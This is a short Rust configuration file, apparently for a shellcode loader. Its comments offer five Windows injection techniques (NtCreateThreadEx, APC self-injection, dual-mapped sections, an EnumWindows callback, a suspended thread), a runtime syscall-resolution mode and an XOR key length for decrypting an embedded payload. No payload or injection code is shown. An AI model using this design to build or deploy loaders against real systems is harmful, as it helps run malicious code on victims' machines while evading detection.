/*
 * Loader build configuration.
 * Edit these values to change loader behavior at compile time.
 */

// --- Technique selection ---
//  0 = nt_thread      NtCreateThreadEx
//  1 = nt_apc         NtQueueApcThread + NtTestAlert (self-inject)
//  2 = nt_section     NtCreateSection + NtMapViewOfSection (dual-map)
//  3 = nt_callback    EnumWindows callback
//  4 = nt_suspended   NtCreateThreadEx (CREATE_SUSPENDED) + ResumeThread
pub const DEFAULT_TECHNIQUE: usize = 0;

// --- Syscall mode ---
//  "runtime"  = GetProcAddress from ntdll at runtime (default)
//  Indirect syscalls not yet implemented for Rust loader.
pub const SYSCALL_MODE: &str = "runtime";

// --- Payload decryption ---
//  XOR key length in bytes (must match the key embedded in shellcode.rs)
pub const XOR_KEY_LEN: usize = 16;
